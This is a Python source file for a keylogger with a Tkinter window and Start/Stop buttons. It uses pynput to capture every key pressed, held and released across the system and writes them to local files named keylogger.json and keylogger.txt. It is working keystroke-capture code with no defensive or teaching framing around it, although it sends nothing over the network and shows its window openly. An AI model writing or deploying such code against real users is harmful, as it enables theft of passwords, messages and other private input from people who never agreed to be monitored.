import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

f=""
keys_used=[]
flag=False
keys=" "

def generate_txt_file(key):
    f=open("keylogger.txt",'w+')
    f.write(key)

def generate_json_file(keys_used):
    f=open("keylogger.json",'+wb')
    key_list_bytes = json.dumps(keys_used).encode()
    f.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if flag==False:
        keys_used.append({'Pressed':f'{key}'})
        flag=True
    if flag==True:
        keys_used.append({'Held':f'{key}'})
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    keys_used.append({'Released':f'{key}'})

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_txt_file(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger has started!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")
root.config(bg="black")

label = Label(root, text='Click "Start" to begin keylogging.',font=("Arial Bold",13),bg="black",fg="white")
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", bg="red",fg="white",font=("Arial Bold",13),command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop",bg="red",fg="white",font=("Arial Bold",13) , command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("300x300")

root.mainloop()

